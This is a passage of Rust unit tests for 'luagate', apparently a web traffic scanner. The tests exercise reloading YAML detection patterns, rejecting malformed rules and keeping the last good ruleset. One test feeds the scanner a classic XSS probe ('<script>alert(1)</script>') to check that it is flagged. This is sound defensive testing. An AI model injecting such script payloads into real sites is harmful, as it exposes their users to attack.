        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml = r#"patterns:
  - threat_type: "sqli"
    rule_name: "reload_test_rule"
    pattern: "(?i)reload_inject"
    score: 0.95
"#;
        fs::write(dir.join("custom.yaml"), yaml).unwrap();

        let path = dir.to_str().unwrap();
        let mut version_buf = vec![0i8; 65];
        let mut pattern_count: usize = 0;

        let rc = luagate_scanner_reload(
            path.as_ptr() as *const i8,
            path.len(),
            version_buf.as_mut_ptr(),
            65,
            &mut pattern_count,
        );

        assert_eq!(rc, LUAGATE_OK);
        assert_eq!(pattern_count, 1);

        // version_buf should contain a 64-char hex string
        let version_str = unsafe {
            std::ffi::CStr::from_ptr(version_buf.as_ptr())
                .to_str()
                .unwrap()
        };
        assert_eq!(version_str.len(), 64);

        // Verify the reloaded pattern works (don't reset to defaults)
        let (rc, threat, rule, score) = scan_without_reset("/", "q=reload_inject");
        assert_eq!(rc, 0);
        assert_eq!(threat, "sqli");
        assert_eq!(rule, "reload_test_rule");
        assert_eq!(score, 0.95);

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_reload_invalid_yaml_preserves_lkg() {
        init_scanner_for_test();

        // Verify current scanner works
        let (rc, threat, _, _) = make_scan_call("/page", "q=<script>alert(1)</script>");
        assert_eq!(rc, 0);
        assert_eq!(threat, "xss");

        // Reload with invalid YAML
        let dir = std::env::temp_dir().join("luagate_test_reload_invalid");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("bad.yaml"), "this is not valid yaml: [[[").unwrap();

        let path = dir.to_str().unwrap();
        let rc = luagate_scanner_reload(
            path.as_ptr() as *const i8,
            path.len(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        // LKG preserved — old scanner still works
        let (rc, threat, _, _) = make_scan_call("/page", "q=<script>alert(1)</script>");
        assert_eq!(rc, 0);
        assert_eq!(threat, "xss");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_reload_duplicate_rule_name_rejected() {
        init_scanner_for_test();

        let dir = std::env::temp_dir().join("luagate_test_reload_dup");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml = r#"patterns:
  - threat_type: "sqli"
    rule_name: "dup_rule"
    pattern: "(?i)inject1"
    score: 0.9
  - threat_type: "xss"
    rule_name: "dup_rule"
    pattern: "(?i)inject2"
    score: 0.8
"#;
        fs::write(dir.join("dup.yaml"), yaml).unwrap();

        let path = dir.to_str().unwrap();
        let rc = luagate_scanner_reload(
            path.as_ptr() as *const i8,
            path.len(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_reload_invalid_regex_rejected() {
        init_scanner_for_test();

        let dir = std::env::temp_dir().join("luagate_test_reload_badregex");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml = r#"patterns:
  - threat_type: "sqli"
    rule_name: "bad_regex_rule"
    pattern: "(?P<unclosed"
    score: 0.9
"#;
        fs::write(dir.join("badregex.yaml"), yaml).unwrap();

        let path = dir.to_str().unwrap();
        let rc = luagate_scanner_reload(
            path.as_ptr() as *const i8,
            path.len(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_reload_score_out_of_range_rejected() {
        init_scanner_for_test();

        let dir = std::env::temp_dir().join("luagate_test_reload_score");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml = r#"patterns:
  - threat_type: "sqli"
    rule_name: "bad_score_rule"
    pattern: "(?i)inject"
    score: 1.5
"#;
        fs::write(dir.join("score.yaml"), yaml).unwrap();

        let path = dir.to_str().unwrap();
        let rc = luagate_scanner_reload(
            path.as_ptr() as *const i8,
            path.len(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_scanner_reload_failed_flag_blocks_scan() {
        init_scanner_for_test();

        // Set the flag
        SCANNER_RELOAD_FAILED.store(true, Ordering::Release);

        let mut threat_buf = vec![0i8; 64];
        let mut rule_buf = vec![0i8; 128];
        let mut threat_len: usize = 0;
        let mut rule_len: usize = 0;
        let mut score: f64 = 0.0;

        let path = "/api/test";
        let rc = luagate_scan_http(
            path.as_ptr() as *const i8,
            path.len(),
            path.as_ptr() as *const i8,
            path.len(),
            std::ptr::null(),
            0,
            std::ptr::null(),
            0,
            std::ptr::null(),
            0,
            threat_buf.as_mut_ptr(),
            64,
            &mut threat_len,
            rule_buf.as_mut_ptr(),
            128,
            &mut rule_len,
            &mut score,
        );

        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);

        // Clear flag
        SCANNER_RELOAD_FAILED.store(false, Ordering::Release);
    }

    #[test]
    fn test_successful_reload_clears_failed_flag() {
        SCANNER_RELOAD_FAILED.store(true, Ordering::Release);

        let dir = std::env::temp_dir().join("luagate_test_reload_clear");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml = r#"patterns:
  - threat_type: "sqli"
    rule_name: "clear_flag_rule"
    pattern: "(?i)test"
    score: 0.5
"#;
        fs::write(dir.join("test.yaml"), yaml).unwrap();

        let path = dir.to_str().unwrap();
        let rc = luagate_scanner_reload(
            path.as_ptr() as *const i8,
            path.len(),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );

        assert_eq!(rc, LUAGATE_OK);
        assert!(!SCANNER_RELOAD_FAILED.load(Ordering::Acquire));

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn test_reload_null_path_returns_internal_error() {
        let rc = luagate_scanner_reload(
            std::ptr::null(),
            0,
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        assert_eq!(rc, LUAGATE_INTERNAL_ERROR);
    }

    #[test]
    fn test_load_patterns_sha256_is_deterministic() {
        let dir = std::env::temp_dir().join("luagate_test_sha256");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let yaml = r#"patterns:
  - threat_type: "sqli"
    rule_name: "sha_test"
    pattern: "(?i)test"
    score: 0.5
"#;
        fs::write(dir.join("test.yaml"), yaml).unwrap();

        let path = dir.to_str().unwrap();
        let (_, _, sha1) = load_patterns_from_dir(path).unwrap();
        let (_, _, sha2) = load_patterns_from_dir(path).unwrap();

        assert_eq!(sha1, sha2);
        assert_eq!(sha1.len(), 64);

        let _ = fs::remove_dir_all(&dir);
    }
}
